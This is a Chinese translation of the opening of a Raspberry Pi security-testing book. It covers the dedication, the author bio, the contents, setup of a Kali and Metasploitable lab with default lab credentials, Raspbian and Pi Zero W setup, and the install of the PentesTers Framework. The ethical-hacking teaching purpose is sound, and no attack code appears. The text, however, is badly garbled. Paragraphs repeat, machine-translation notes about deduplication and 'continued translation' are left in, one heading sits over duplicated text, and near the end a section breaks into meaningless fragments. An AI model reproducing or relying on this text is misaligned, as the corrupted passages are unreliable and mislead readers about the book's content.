# Raspberry Pi 安全测试：使用强大的树莓派进行计算机系统安全测试










## 献辞

献给我的家人和朋友，感谢他们无尽的支持与鼓励。没有他们，我的第 6 个主要写作项目将无法实现。你们对我来说意味着一切！只剩下最后写一本书了！也许……

Daniel Dieterle

“没有战术的战略是通往胜利最慢的道路。没有战略的战术是失败前的噪音。” —— 孙子

“需要是发明之母” —— 未知

“你们看，我把你们像羊送入狼群一样，所以要像蛇一样机灵，像鸽子一样纯洁。” —— 马福音 10:16 (KJV)

## 关于作者

Daniel W. Dieterle 在 IT 领域工作了 20 多年。在此期间，他曾在一家计算机支持公司工作，为纽约州北部和整个宾夕法尼亚州的数百家公司提供系统和网络支持。他还在一家财富 500 强企业的数据中心工作过，在常春藤学院的计算机支持部门短暂工作，并在一家电气工程公司担任过。

在过去的 9 年里，Daniel 作为计算机安全研究员和作者完全专注于安全领域。他的文章发表在国际安全杂志上，并被技术实体和媒体引用。他基于 `Kali Linux` 的书籍在全球范围内被大学、技术培训中心、政府和私营机构作为教学培训资源。Daniel 协助创建了许多安全培训课程和技术培训书籍，主要基于道德黑客和 `Kali Linux`，并乐于帮助该领域的新手。

Daniel W. Dieterle

![](img/00002.jpeg)

电子邮箱：cyberarms@live.com

网站：cyberarms.wordpress.com

Twitter：@cyberarms

## 特别感谢

特别感谢帮助我编写这本书的朋友们。你们的时间、见解和投入我深表感谢。

Bill Marcy – 我的主编兼朋友，感谢你鼓励我写这本关于树莓派的 50 页安全书籍。另外的 150 多页（左右）只是额外赠品。

@alphaomikron – 非常感谢你在封面艺术上付出的努力，它太棒了！感谢你持续的友谊，以及那些斯巴达礼物，太赞了！

Azime Setol – 非常感谢你的见解、鼓励、智慧和幽默！

我的信息安全家人 – 非常感谢你们与我分享你们的时间、知识和友谊。在我心中，你们都是超级巨星！







# P4wnP1 A.L.O.A.

## 安装
## 连接到 P4wnP1
## P4wnP1 控制面板界面
## 运行你的第一个脚本
## 制作自己的 P4wnP1 脚本
## 使用 P4wnP1 让你的电脑说话

## 第 10 章
### 物理安全与其他选项
- ZeroView 外壳
- MotionEyeOS
- RPI Cam Web Interface 软件
- 使用 `raspivid` 进行低延迟 Pi Zero W 视频流
- 使用 Python 和 PiCamera 捕捉视频
- 其他项目可能性：便携式夜视！
- 伪监控摄像头
- 魔法镜
- 使用 RTL-SDR & Salamandra 寻找间谍虫
- 使用树莓派追踪飞机
- 使用 Pi-Hole 拦截广告和恶意网站
### 总结与结束

# 第 11 章
## Pi 防御与总结
- 使用 Shodan 进行扫描
- 使用 Shodan 网络监控进行自动报警
- 常规安全应用
- 补丁与更新
- 私有局域网与防火墙
- 限制服务与权限
- 复杂密码
- 网络安全监控
- 日志
- 教育你的用户
- 扫描你的网络
- 攻击性计算机安全
## 总结

# 第 1 章：使用树莓派进行安全测试

![](img/00003.jpeg)

### 什么是树莓派计算机？
树莓派 (`RPi`) 是一种由技术人员、教育者和爱好者使用的 ARM 单板计算机。由于易于使用、用户群庞大且功能强大，树莓派是最流行的单板计算机之一。`RPis` 可以作为高性价比的桌面电脑使用，也用于机器人、科学项目、监控系统、监控摄像头以及无数其他项目。`RPi` 的潜在用途实际上受限于使用者的想象力。在本书中，我们将重点关注在计算机安全领域使用 `RPi`。我们将涵盖如何将该设备作为安全测试工具和实验室目标。我们还将涵盖 `RPi` 在物理安全中使用的许多方法。所以，请坐好并系好安全带，这将是一个有趣的旅程！

### 为什么在安全领域使用树莓派？
树莓派是安全行业的绝佳工具。你可以在树莓派上安装一些行业标准的安全测试工具和应用程序，大多数情况下，它们的功能与 Linux 对应的版本完全相同。例如，你可以在 `RPi` 上运行一个功能完整的 `Kali Linux` 副本，让你获得像在 Linux 桌面面上运行它时所拥的所有道德黑客工具。`Kali Linux` 在安全社区中非常流行，因为它允许你使用与黑客类似的工具和技术来测试网络安全，这样你就可以在真实黑客发现这些问题之前发现并纠正它们。

我认为使用树莓派而非桌面电脑的最大动力是价格。你可以在树莓派上安装一些行业标准的安全测试工具和应用程序，在大多数情况下，它们的功能与 Linux 对应的版本完全相同。例如，你可以在 `RPi` 上运行一个功能完整的 `Kali Linux` 副本，让你获得像在 Linux 桌面面上运行它时所拥的所有道德黑客工具。`Kali Linux` 在安全社区中非常流行，因为它允许你使用与黑客类似的工具和技术来测试网络安全，这样你就可以在真实黑客发现这些问题之前发现并纠正它们。

（注：原文中存在段落重复，已根据指令“不要重复输出原文”进行去重处理）

我认为使用树莓派而非桌面电脑的最大动力是价格。你可以在树莓派上安装一些行业标准的安全测试工具和应用程序，在大多数情况下，它们的功能与 Linux 对应的版本完全相同。例如，你可以在 `RPi` 上运行一个功能完整的 `Kali Linux` 副本，让你获得像在 Linux 桌面面上运行它时所拥的所有道德黑客工具。`Kali Linux` 在安全社区中非常流行，因为它允许你使用与黑客类似的工具和技术来测试网络安全，这样你就可以在真实黑客发现这些问题之前发现并纠正它们。

（此处继续后续翻译...）
`RPi` 的潜在用途实际上受限于使用者的想象力。在本书中，我们将重点关注在计算机安全领域使用 `RPi`。我们将涵盖如何将该设备作为安全测试工具和实验室目标。我们还将涵盖 `RPi` 在物理安全中使用的许多方法。所以，请坐好并系好安全带，这将是一个有趣的旅程！

### 为什么在安全领域使用树莓派？
树莓派是安全行业的绝佳工具。你可以在树莓派上安装一些行业标准的安全测试工具和应用程序，在大多数情况下，它们的功能与 Linux 对应的版本完全相同。例如，你可以在 `RPi` 上运行一个功能完整的 `Kali Linux` 副本，让你获得像在 Linux 桌面面上运行它时所拥的所有道德黑客工具。`Kali Linux` 在安全社区中非常流行，因为它允许你使用与黑客类似的工具和技术来测试网络安全，这样你就可以在真实黑客发现这些问题之前发现并纠正它们。

使用树莓派而非桌面电脑的最大动力是价格。树莓派 3b+ 约为 50 美元。树莓派还包含了许多免费软件版本，你可以通过使用 `Kali` 来替代昂贵的安全解决方案。树莓派被渗透测试人员和红队成员用作跳板（drop boxes）——它们提供对目标网络的访问。

在本书中，我们将看到如何在使用树莓派上运行 `Kali Linux`。我们将看到如何在树莓派上使用 `RPi`。我们还将涵盖一些在树莓派原生操作系统运行运行黑客工具。最后，我们将看到如何将 `RPi` 作为硬件接口攻击工具。最后，我们将如何在物理安全应用中使用树莓派，例如将其用作监控摄像头。

### 本书的先决条件和范围
书中的教程旨在以易于遵循的方法逐步引导读者完成练习。尽管如此，由于在树莓派上使用黑客工具的复杂性，这并不是一本入门级书籍，也不是一本“如何使用 RPi”的书籍。本书侧重于那些对 `Kali Linux` 和道德黑客具有初中级技能、具备基础网络知识、熟悉虚拟系统，并且已经使用树莓派系统经验的人。虽然不像我之前的书籍那样完全专注于 `Kali Linux`，但我们在书中会频繁使用 `Kali`，因此对其有一定的工作知识是一个好主意。我们将在树莓派的多个内存卡上使用多个镜像，因此熟悉写入、更换和使用多个操作系统镜像是比较好的。





我强烈建议你拥有或购买至少 5 张树莓派兼容的 microSD 内存卡。我们将安装多个操作系统，并使用多个修改底层系统的工具，因此为了获得最佳效果，最好为许多章节使用独立的内存卡。你可能还想准备几张 32GB 的卡（可选），但对于某些全工具选项的安装，16GB 的卡空间确实不够用。

### 极力推荐

- 5 包装 RPi 兼容内存卡（闪迪 SanDisk 16GB MicroSD HC Ultra Class 10 或更高规格）

你可能需要一个适配器来在台式电脑上使用 microSD 卡：

![](img/00004.jpeg)

你还需要：

- 一个树莓派 Zero W
- 一个树莓派 3b+ 或 Pi 4
- 一个树莓派 3b（部分可选——仅在 RasPwn 章节中真正需要）
- Raspberry Pi v2 8 MP 摄像头，配备 Pi Zero W 线缆或 Pi3/4 线缆
- 树莓派外壳（有很多种选择）
- 树莓派电源适配器
- 树莓派外围设备——视频显示器、键盘、鼠标、连接线
- 带有 microSD 卡读写器的台式电脑——优先选择 Windows 系统
- 一个 USB WiFi 适配器——我交替使用 TL-WN722N (v1) 和 Alfa AWUS036NHA

我们还将在台式电脑上运行几个虚拟机，包括 VMWare 和 VirtualBox。一台最低配置要求至少为 8GB 内存的现代系统。

可选地，你可能想要：

- 几张 32GB 内存卡用于全工具安装选项
- 树莓派夜视摄像头
- Pi 电池
- 树莓派外壳，如 ZeroView 和 7 英树莓派 3 触摸屏外壳（在某些示例中显示，并非必须，但外壳非常棒！）

注意：如果你使用的是 Pi Zero W 或 Pi 3/4 系列，摄像头线缆是不同的。请确保为你购买适用于你的树莓派版本的正确线缆。

树莓派有很多选择可选！有许多不同风格的外壳、配件和适配器。以下是编写本书时用到的一些硬件概览：

![](img/00005.jpeg)

### 树莓派套装

如果你是树莓派的新手，最好的开始方式之一是使用套装（Kit）。通常当你购买树莓派时，你只得到电脑主板。套装可以（取决于具体套装）提供内存卡、外壳、电源、散热器以及可能性的连接线。你必须仔细查看套装内容，有时它们是不包含树莓派的！当我买一个新的树莓派时，我通常会买一个包含主板、电源、散热器的套装，并另外购买一个带风扇的外壳。

树莓派 3B+ & 4 套装——有很多树莓派套装可用。我尝试过不同制造商的几个套装，从未出现过任何问题，但我更喜欢 Cana 套装和 Adafruit 套装。

对于 Sticky Kali Pi 章节，我使用了一个 Adafruit Pi-Hole 套装——这包括一个 2.8 英的 PiTFT 显示器和一个 Pi 3b (`https://blog.adafruit.com/2018/10/11/new-product-ad-blocking-kit-for-pi-hole-with-2-8-pitft-no-soldering/`)。

![](img/00006.jpeg)

树莓派 Zero W 套装——如果你从未拥有过 RPI Zero W，我建议购买一个包含视频和 USB 适配器的套装，因为这块 Pi 使用微显示器接口和 Micro USB C 类型接口。你可能还需要一个带供电的 USB Hub 来将多个 USB 设备连接到你的 Pi 0W，但这不是必须的。我使用过 Adafruit Pi Zero W Camera kit1，它包含 Pi Zero W、Pi Camera v2（80 万像素）和一个外壳。Vilros Pi Zero W Complete Starter Kit2 也很好，因为它包含了必要的连接适配器和线缆，但不包含摄像头。

### 道德黑客问题

在道德黑客与渗透测试中，安全测试人员基本上就像黑客。他们使用黑客最可能使用的工具和技术来测试目标网络的安全。区别在于他们受公司雇用进行安全测试，并在完成后向领导团队展示他们是如何进入的，以及可以如何修复漏洞。我在使用这些技术时看到的最大问题是伦理和法律。书中的一些安全测试技术在某些地区实际上是非法的。因此，用户在使用书中的信息之前，检查他们的当地、州和联邦法律是非常重要的。

此外，你可能会有一些用户尝试在他们没有获得许可的网络上使用 Kali Linux 或道德黑客工具。或者他们会尝试在生产环境网络上使用他们学过但可能尚未精通的技术。这些都是潜在的法律和伦理问题。切勿对你没有获得明确书面许可的系统运行安全工具。此外，在尝试在实时系统上使用可能修改数据或可能导致系统不稳定的测试之前，最好的方法是在一个离线的、非生产环境的网络副本上运行这些测试并分析结果。

### 免责声明

切勿尝试访问你不拥有的电脑，或在没有获得书面许可的情况下对网络或电脑进行安全测试。此举可能会导致你面临法律起诉，你还可能身入监狱。

书中的信息仅供参考。




设置虚拟机使得在实验室环境中学习攻击性计算机安全测试变得非常简单。这样一来，我们就不需要一整个房间的电脑来搭建学习环境，只需要一台足够强大可以同时运行多个虚拟机会话的机器即可。在编写本书时，我使用了一个带有 8 GB 内存的 Windows 7 Core i7-6700 系统作为虚拟机宿主机。它有足够的动力同时运行我们的三个实验室操作系统，且完全没有问题。虽然 64 位版本的工作原理也类似，但我为 Kali Linux 的安装选择了 32 位版本，因为 Kali 中安装的某些工具只会在 32 位系统上运行。如果你有虚拟系统的经验，可以使用任何你喜欢的虚拟机软件。我将使用 `VMware Player` 作为 Kali Linux 和 Metasploitable 2 的宿主机。更高级的读者还可以在 `VirtualBox` 中设置 Metasploitable 3，作为一个额外的测试目标。

当一切设置完成后，我们应该有一个有一个如下所示的小型测试网络：

![](img/00007.jpeg)

我在书中使用的是 `172.24.1.0` 网络布局。你的网络/IP 地址可能会有所不同。

**注意**：由于我们将处理脆弱的操作系统，请确保在宿主机系统和互联网之间有一个防火墙（最好是硬件防火墙）！

### 安装 VMware Player & Kali

在 `VMware` 上安装 Kali 非常简单，因为 Offensive Security 提供了一个可以下载的 Kali VMware 镜像，所以我们不会在这上面花费大量时间。基本上，只需下载 Kali 虚拟机镜像并在 `VMWare Player` 中打开它即可。我们将逐步完成这一过程。

1. 为适用于你的操作系统版本下载并安装 `VMWare Player`。

`VMWare player` 的版本和下载位置经常发生变化。在写本文时，`VMWare Player` 的当前版本是“VMWare Workstation 15 Player”。它可以作为非商业用途的免费版运行，也可以通过许可运行：

([`www.vmware.com/go/tryplayer`](https://www.vmware.com/go/tryplayer))

![](img/00008.jpeg)

2. 选择你想安装的位置，通常使用默认设置即可。

3. 按照安装提示操作，在需要时重启电脑。

4. 启动 `VMWare`，对于免费版输入你的电子邮件地址，或者为商业用途购买并输入许可密钥。

5. 点击“继续（Continue）”，完成后点击“完成（Finish）”。

6. 下载 Kali Linux 32 位虚拟机镜像 ([`www.offensive-security.com/kali-linux-vm-vmware-virtualbox-hyperv-image-download/`](https://www.offensive-security.com/kali-linux-vm-vmware-virtualbox-hyperv-image-download/))。

验证下载文件的校验和始终是一个好习惯，用以确认文件正确且未被修改或损坏。在 Windows 中，你可以使用 `certUtil` 命令执行此操作：

7. 从命令提示符中输入 `certUtil -hashfile [kali linux 下载文件] SHA256`

![](img/0009.gif)

然后与 Kali 页面上列出的校验和进行比对。

8. 接下来，将文件提取到你想运行它的位置。

9. 启动 `VMware Player`。

10. 从菜单中点击“播放（Player）”。

11. 点击“文件（File）”。

12. 接下来点击“打开（Open）”。

13. 导航到提取出的 Kali Linux `.vmx` 文件，选中它并点击“打开（Open）”。

14. 它现在将出现在 `VMWare Player` 主界面上。

15. 选中 Kali 虚拟机，点击“编辑虚拟机设置（Edit Machine Settings）”。

16. 在这里你可以查看并更改虚拟机的任何设置：

![](img/0010.jpeg)

17. 点击“网络适配器（Network Adapter）”：默认设置为 `NAT`（网络地址转换）。`NAT` 意味着每个虚拟机将在一个小的 `NAT` 网络中创建，并在它们之间以及宿主机共享；如果需要，它们也可以访问互联网。有些人报告说使用 `NAT` 会遇到问题且只能使用桥接（`Bridged`），因此我在书中对我的所有虚拟机都使用了 `bridged` 模式。如果你使用 `bridged`，请确保你的系统和互联网之间有一个硬件防火墙。此外，确保宿主机位于私有局域网，与任何业务或关键系统隔离。

18. 点击“确定（OK）”返回 `VMWare Player` 主界面。

19. 现在只需点击“播放虚拟机（Play Virtual Machine）”即可启动 Kali。你可能会收到询问虚拟机是否已移动或复制的消息，只需点击“我复制了（I copied it）”。

20. 请求安装 `VMWare tools` 时，选择稍后安装。

21. 当 Kali 启动时，你将进入登录界面：

![](img/0011.jpeg)

22. 使用用户名“root”和密码“toor”（root 的反写）登录。

23. 随后你将看到主桌面：

![](img/0012.jpeg)

我们现在已安装 Kali 虚拟机。

### 设置 Kali IP 地址

如果你愿意，可以把所有 IP 地址留为动态分配（DHCP）。这可能会变得有点混乱，你可能想为你的 Kali Linux 和 Metasploitable 2 系统设置 IP 地址。你可以通过以下步骤设置 Kali IP 地址。

1. 点击右上角的向下三角形。

2. 点击“已连接（（Connected）”。

3. 然后点击“有线设置（Wired Settings）”，如下：

![](img/013.jpeg)

4. 点击左侧的“网络（Network）”。

5. 在“有线 - 已连接”下点击设置图标：

![](img/014.jpeg)

6. 点击 `IPv4` 标签页

7. 点击“手动（Manual）”单选按钮

8. 在地址下输入 IP 地址、子网掩码和网关：

```
172.24.1.39 255.255.255.0 172.24.1.1
```

9. 完成后点击“应用（Apply）”。

重启系统。回来后，打开终端（点击启动处的终端）并运行 `ifconfig` 使 IP 地址已更改：

![](img/015.jpeg)

如果你的路由器设置正确，你也应该能够访问互联网：

![](img/016.jpeg)

就这样；Kali 现在已安装并就绪。

### 更新 Kali

Kali Linux 经常更新以包含最新的工具和功能。要更新 Kali，打开终端并输入：

```
apt update
apt upgrade
```

![](img/017.jpeg)

更新可能需要一段时间，并可能提示你输入。如果你不确定如何回答问题，直接使用默认响应。更新完成后重启。

现在 Kali 已更新，我们来谈谈 VMWare tools。

### VMWare tools

当 Kali 启动时，不要在提示时安装 VMware tools。最新版本的 Kali 默认安装了 Vare tools。这使得操作系统与 `VMware` 配合得更好，通常提供更多视频选项控制并启用与主机的复制粘贴功能。如果宿主机与 Kali 虚拟机之间的复制粘贴停止工作，Kali 桌面上有一个文件可以重启 `vmtools`，让复制粘贴再次可用：

![](img/018.jpeg)

### 安装 Metasploitable 2

Metasploitable 2 是故意脆弱的 Linux 操作系统，作为一个 `VMware` 虚拟机。正如我们上面对 Kali 虚拟机所的操作，我们只需要下载 Metasploitable 2 虚拟机镜像、解压并使用 `VMware Player` 打开它。

1. 下载 Metasploitable 2 ([`sourceforge.net/projects/metasploitable/files/Metasploitable2/`](http://sourceforge.net/projects/metasploitable/files/Metasploitable2/))

2. 解压文件并放在你选择的文件夹中：

![](img/0020.jpeg)

然后通过启动另一个 `VMWare Player` 在 `VMWare Player` 中打开 Metasploitable 2。





- 然后点击“播放 (Player)”、“文件 (File)”、“打开 (Open)”
- 导航到 `Metasploitable.vmx` 文件，选中它并点击“打开”

![](img/00021.jpeg)

它现在会出现在 VMware Player 列表中。

3. 现在进入 Metasploitable 的“编辑虚拟机设置”，并确保网络接口设置为“桥接 (Bridged)”（如果你喜欢，也可以设置为 NAT，只需确保所有虚拟机都设置为相同的设置）。

![](img/00022.jpeg)

Metasploitable 2 现在已准备就绪。

![](img/00023.gif)

开始启动 Metasploitable 系统，如果系统询问你你是移动了还是复制了它，点击“我已复制它”。你现在应该可以看到 Metasploitable 桌面：

![](img/00024.gif)

4. 登录 - 注意登录提示符上方列出的管理员登录凭据 - 呵呵，安全安全！

登录名：`msfadmin`

密码：`msfadmin`

要退出此虚拟机窗口并夺回鼠标控制权，只需按下 `Ctrl-Alt`。

### 设置 Metasploitable 2 的 IP 地址

默认情况下，Metasploitable 2 的地址设置为“动态 (Dynamic)”。要将其设置为静态 IP，编辑 `/etc/network/interfaces` 文件并手动设置 IP 地址、子网掩码和网关（这些数字在你的网络中可能会不同）。我使用的 IP 地址是 `172.24.1.218`。

- 在 Metasploitable2 中导航到网络目录，`cd /etc/network`
- 输入 `sudo nano interfaces`
- 修改 `iface eth0 inet dynamic` 行，将“dynamic”替换为“static”

然后输入 IP 地址、子网掩码和你的路由器网关。它看起来应该像下面的截图：

![](img/00025.gif)

- 完成后，按 `ctrl-x`、`y`，然后按 `enter`
- 输入 `cat interfaces` 来验证你的更改：

![](img/00026.gif)
- 输入 `sudo reboot` 重启 Metasploitable2

我们现在已经设置好了 Metasploitable2 和 Kali 系统并准备就绪。要验证 Kali 和 Metasploitable2 是否可以互相看到，使用 `ping` 命令。

在 Kali 终端中，ping Metasploitable2 虚拟机

- 输入 `ping [Metasploitable IP Address]`，例如在我的情况下，将是 `ping 172.24.1.218`
- 按 `Ctrl-c` 停止

![](img/00027.jpeg)

在 Metasploitable2 中，ping Kali 虚拟机：

![](img/00028.gif)

如果你在两个响应中都看到“64 bytes from …”，那么就可以确定一切都设置好了，它们可以互相看到并正常通信。按 `Ctrl-Alt` 退出 Metasploitable2 虚拟机。

### Metasploitable 3 安装（可选 - 高级）

我将 Metasploitable 3 作为书中的某些攻击目标。与 MS2 不同，MS3 是基于 Windows 的目标。我喜欢它是因为因为它提供了一套完全不同的服务可供攻击。它还包含了“夺旗赛 (Capture the Flag)”类型的游戏。通过利用服务，可以访问分散在文件系统中的开发者图片。我将其列为可选，因为我只建议高级用户尝试安装 MS3。最初你必须手动构建 MS3，而且有很多安装问题。你现在可以获得一个“预安装”版本，但你仍然需要像对待 MS2 一样“构建”它。MS3 似乎在 VirtualBox 中运行得更好。因此，我在运行 VMWare 的同一台主机上安装了 VirtualBox。你只需要将 MS3 镜像设置为桥接网络，并为它提供与你的 VMWare 虚拟机相同的网络地址，它们就能通信得很好。

- 下载并安装 VirtualBox：[`www.virtualbox.org/`](https://www.virtualbox.org/)
- Metasploitable 3 快速启动和完整手册可以在此处找到：[`github.com/rapid7/metasploitable3`](https://github.com/rapid7/metasploitable3)

一旦构建了 MS3 镜像添加到 VirtualBox 中，打开 VirtualBox 中该虚拟机的网络设置，并将网络适配设置为“桥接 (Bridged)”：

![](img/00029.jpeg)

启动 MS3，登录（用户和密码 = `vagrant`），然后你可以在 Windows 设置中为 MS3 设置网络 IP 地址。

### 虚拟机安装总结

到目前，在本节中涵盖了如何安装 VMWare Player 作为虚拟机主机。然后我们查看了 Kali Linux 和 Metasploitable 2。我们还讨论了可选在同一台 Windows 主机上通过 VirtualBox 运行 Metasploitable 3。我们将它们都设置为使用相同的网络，以便它们可以相互通信并连接互联网（用于 Kali 更新）。我们将在书的其余部分使用这种设置。提醒一下，如果你设置了自己的宿主机并使用 DHCP，那么系统的 IP 地址在重启时可能会发生。如果你不确定动态分配的地址是什么，可以在虚拟机中运行 `ifconfig` (Linux) 或 `ipconfig` (Windows) 来查找它。

### 树莓派 (Raspberry Pi) 安装说明

每一章都将涵盖树莓派是用来做什么的，以及推荐为它安装什么操作系统。如前提到的，我们将在书中介绍许多不同的 RPi 设置。我只是想在开始之前对树莓派介绍几点。

树莓派 OS 通常涉及：

- 从互联网下载 RPi OS 镜像
- 将其提取到 SD 卡

### 如何安装 Raspbian

让我们快速浏览如何在树莓派上安装 Raspbian。对于其他树莓派操作系统，安装也是类似的。再次，这些只是信息，你现在不需要安装操作系统，我们将在章节中进行。但如果你以前没有安装过 Raspbian，执行安装是一个良好的习惯。你可以在需要时重写内存卡。

从 Raspbian 下载页面：[`www.raspberrypi.org/downloads/raspbian/`](https://www.raspberrypi.org/downloads/raspbian/)

选择你需要使用的 Raspbian 版本：

![](img/00030.jpeg)

我们将根据章节使用 Raspbian Buster 桌面版或 Raspbian Buster Lite。最好验证下载文件的 SHA-256 哈希值。如果你使用 `qBittorent` 下载 Torrent 版本，它会自动验证哈希。这保证了你获得的是未修改的文件。

文件下载后，只需将你的 MicroSD 内存卡插入电脑的 MicroSD 接口。内存卡将在 Windows 中显示为可移动驱动器：

![](img/00031.jpeg)

现在，只需将镜像写入驱动器。我使用 `balenaEtcher` (Etcher) 写入 Pi 镜像，它非常易用且效果极佳。如果下载镜像是压缩过的（大多数 Pi 镜像都是 .zip 或 .7z），你可能先解压缩。Etcher 可以在线处理，但速度会慢得多。

- 下载 `balenaEtcher`，安装并运行 Etcher
- 选择你的下载镜像，确保驱动器正确并点击“闪存 (Flash!)”

![](img/00032.jpeg)

Etcher 然后将镜像写入内存卡：

![](img/00033.jpeg)





如果你使用的是适用于树莓派 3 或 4 系列的卡，那么你已经准备好了。写入完成后，只需弹出卡，将其插入 Pi，连接所有外围设备，最后为 Pi 接通电源。在首次启动时，文件系统将调整大小以占据整个驱动器并重启。随后它将进入 Raspbian 桌面。

在第二次启动时，它会显示一个快速设置界面。

你将设置以下信息：

* 地理位置（非常重要）
* 密码（也非常重要！）
* 视频设置
* WiFi 设置

然后它会提示你更新系统软件并重启。之后你就可以开始使用漂亮的 Raspbian 系统了：

![](img/00034.jpeg)

Pi Zero W 的设置方法几乎相同，但多了一个可选步骤。

### 在 Pi Zero W 上设置 WiFi

你现在不需要执行此操作，我们将在以后在实际使用它时再次介绍如何操作。但在 Pi Zero W 上，偶尔你需要在首次启动之前设置 WiFi 配置。由于 Pi0W 没有内置网络卡，你需要预先设置 WiFi 路由器的信息，以便能够远程连接到 Pi。这在写入镜像之后、但在从写入器拔出卡之前完成。简单来说，你需要将以下文本复制到文件中，添加你的 Wi-Fi 名称和密码，并将其保存到 SD 卡的根目录。如果你在 Windows 上进行操作，需要将文件的换行符（End of Line）设置为 Linux 格式。一种简单的方法是使用程序“Notepad++”，可以在 [`notepad-plus-plus.org/`](https://notepad-plus-plus.org/) 下载。

你也可以在内存卡的根目录下创建一个名为 `ssh` 的空文件。这样做会自动开启 SSH，这样你就可以真正无头运行 Pi0W（仅内存卡和电源，不连接任何外围设备）。此过程在树莓派论坛中有介绍，也可以在这篇 Raspberry Pi Spy 文章 1 中找到。

* 创建一个新的文本文件：

```
country=us
update_config=1
ctrl_interface=/var/run/wpa_supplicant
network={
  scan_ssid=1
  ssid="Your Wi-Fi Router Name"
  psk="Your Wi-Fi Password"
}
```

然后，如果你使用的是 Notepad++：

* 点击“编辑”（Edit）
* 然后“ EOL 转换”（EOL conversion）
* 并“设置为 Linux”（Set to Linux）

如下所示：

![Pi Zero W Camera 4](img/00035.jpeg)

3. 完成后，将文件以 `wpa_supplicant.conf` 保存在 MicroSD 卡的根目录下。
4. 同样创建一个没有扩展名的 `ssh` 空文件，并将其放在根目录。
5. 将内存卡插入 Pi，连接外围设备，然后插上电源。
6. 使用 SSH 或 Putty 连接到 Pi。使用用户 `pi` 和密码 `raspberry` 登录。

就是这样！如果你在无头运行 Pi0W，不需要连接键盘、鼠标或显示器，因为将远程连接到 Pi。

### 查找你的 RPi IP 地址

在使用 DHCP 设置 Pi 时，如何在网络上找到它？当你将 Pi 连接到网络时，它很可能会获得一个随机地址。你可以采取几种方法来定位它。如果你的 Pi 连接了显示器和键盘，只需进入终端并运行 `ifconfig`。

如果你的 Pi 是以“无头”模式运行——即没有键盘、显示器或鼠标：

1. 检查你的路由器，查看它分配给 Pi 的 IP 地址（请参阅路由器用户手册）。
2. 使用 `nmap` 扫描。

如果你有一台安装了 `nmap` 的 Linux 机器，这可能是最快的方法。

```
ifconfig
```

### 使用 XMING 和 Putty

在使用 DHCP 设置 Pi 时，如何在网络上找到它？当你将 Pi 连接到网络时，它很可能会获得一个随机地址。你可以采取几种方法来定位它。如果你的 Pi 连接了显示器和键盘，只需进入终端并运行 `ifconfig`。

如果你的 Pi 是以“无头”模式运行——即没有键盘、显示器或鼠标：

1. 检查你的路由器，查看它分配给 Pi 的 IP 地址（请参阅路由器用户手册）。
2. 使用 `nmap` 扫描。

如果你有一台安装了 `nmap` 的 Linux 机器，这可能是最快的方法。

```
nmap
```

### Kali-Pi 的“Kalipi-Config” 配置

如果你熟悉 Raspbian，你就知道运行 `raspi-config` 来执行某些功能，如设置地理位置、扩展文件系统以填充内存卡、启用 Pi 摄像头或开启/关闭 SSH 服务。在 Re4son 的 Kali-Pi 中也有同样的程序，它被称为 `kalipi-config`。





- Kali VMware 下载 - [https://www.offensive-security.com/kali-linux-vm-vmware-virtualbox-hyperv-image-download/]
- 1“使用 `wpa_supplicant.conf` 手动在 Pi 上设置 WiFi” - [https://www.raspberrypi-spy.co.uk/2017/]

# 第 3 章

## Raspbian 上的渗透测试框架 (PenTesters Framework)

![](img/00046.jpeg)

作者：David Kennedy, TrustedSec
工具网站：[https://www.trustedsec.com/pentesters-framework/]
GitHub 站点：[https://github.com/trustedsec/ptf]
PTF 演示视频：[https://vimeo.com/137133837]

渗透测试框架 (PTF) 是一个 Python 脚本，用于在基于 Debian、Ubuntu 和 ArchLinux 的发行版上安装一组常用的渗透测试工具。由于 Raspbian 是基于 Debian 的，PTF 可以正确地安装在 Raspberry Pi 3b+/ 4 上，且许多工具无需修改即可运行。尽管某些已安装的工具无法在 Pi 上运行。

PTF 会将你选择的渗透测试工具类别安装到 Raspberry Pi 的 `/pentest` 目录中。然后你可以从 Raspbian 终端访问并运行已安装的工具。安装过程需要一些时间，特别是当你进行全 PTF 安装时。但一旦完成，你就将拥有一个类似于 Kali Linux 的平台，直接在 Raspbian 上就能运行许多最常用的工具！

### 安装和更新 Raspbian

本章将使用 Raspberry Pi 3b+ 和 Raspbian。它在 Pi 4 上的用法完全相同。下载“Buster with Desktop”（带桌面版）版本的 Raspbian，然后进行完整更新。

- 如果需要，安装 Raspbian 的说明可以在“安装操作系统”章节中找到。
- 内存卡写入完成后（我使用 Etcher），将内存卡插入 Pi，连接上键盘、鼠标、网线和视频显示器。
- 最后，接通 Pi 的电源。
- 按照启动时的桌面设置向导进行操作，并执行完整更新。

### 安装 PTF

安装并更新好 Raspbian 之后，下一步是安装 PTF。我强烈建议读者观看工具作者提供的 PTF 演示视频（链接在章节开头）。由于此视频涵盖了许多 PTF 主题，我们将快速跳过。PTF 由分类分类模块组成。你可以安装单个 PTF 模块或安装所有模块。如果你想对 PTF 进行全量安装，你需要一张 32 GB 的卡。全量安装在 Pi 上也可能需要几个小时。

注意：某些在 Raspbian Stretch 上运行良好的 PTF 工具，似乎在 Raspbian Buster 上运行时存在问题，希望未来的更新能修复这些问题。

在 Raspbian 终端中操作：

- 输入 `sudo su`
- 接下来，执行 `git clone https://github.com/trustedsec/ptf/`
- 最后，执行 `cd ptf`

如下所示：

![](img/00047.gif)

现在启动 ptf：

- 输入 `./ptf`
- 在 `ptf>` 提示符下，输入 `show modules`

你将看到 PTF 所有可用的模块列表。你可以逐个安装。如果你有一个 32GB 的内存卡，可以安装所有模块：

- 使用 `modules/install_update_all`

![](img/00048.gif)

PTF 包含了许多流行的安全工具，你也可以添加新的或自定义的工具（在 PTF 演示视频中讨论过）。我们将查看其中几个，并展示一些用法示例。但首先，安装将花费非常长的时间，所以现在是起身去做点其他事情的好时机。只需定期检查即可，你可能需要等一会儿。

在 Raspbian 终端中：

- images00000. )
- 在 ` 0   00000. ：
- 你将看到 PTF 所有工具模块。。  
安装。
       0，00 
：
- 运行     000

 
：
- 终端中执行，你将看到：

![](img/00049.gif)
- 启动 Pi
- 接下来看到看到：

![](img/0047.gif)
- 终端中 Rasp
- 





0000000.





： 某些在 Raspbian Stretch 上运行良好的 PTF 工具，似乎在 Raspbian   问题问题，希望未来的更新能修复这些问题。

在 Raspbian 终端中：

- 输入，`sudo su`
- 接下来，执行 `git clone https://github.com/trustedsec/ptf/`
- 最后，执行 `cd ptf`

如下所示：

![](img/00047.gif)

现在启动 ptf：

- 输入 `./ptf`
- 在 `ptf>` 提示符下，输入 `show modules`

你将看到 PTF 所有可用的模块列表。你可以逐个安装。如果你有一个 32GB 的内存卡，可以安装所有模块：

- 使用 `modules/install_update_all`

![](img/00048.gif)

